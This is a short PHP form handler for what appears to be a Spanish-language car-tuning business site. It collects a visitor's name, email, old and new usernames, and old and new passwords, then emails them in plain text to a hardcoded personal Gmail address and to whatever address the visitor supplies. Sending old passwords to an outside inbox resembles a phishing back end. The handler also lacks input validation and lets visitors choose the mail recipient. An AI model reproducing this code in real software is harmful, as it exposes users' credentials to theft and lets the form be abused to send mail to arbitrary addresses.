<?php
$envio = "dennisalexander11770@gmail.com";
$Nombre= $_POST["name"];
$Apellido= $_POST["apellido"];
$Email= $_POST["Correo"];
$a_Usuario= $_POST["name"];
$a_Clave=$_POST["pws"];
$Usuario= $_POST["N_name"];
$Clave=$_POST["N_pws"];

$contenido =  "nombre \n" . $Nombre ."\nApellidos \n". $Apellido  ."\nEmail\n" . $Email ."\nUsuario antiguo\n" . $a_Usuario . "\nAntiguo contraseña\n" . $a_Clave."\nNuevo Usuario\n". $Usuario . "\nNueva contraseña \n" . $Clave ;

mail('dennisalexander11770@gmail.com','Administración Scar Tunnig',$contenido ,'Administrador');    
mail($Email,'Usuario',$contenido, 'Te comunicastes con nosostros');    
    echo"<script>alert('Se Reguistro sus datos par su envio si eliguio el pago con tarjeta se llevara un terminal de pago ');
    window.location='/empresa_auto_lujos/'</script>";
?>
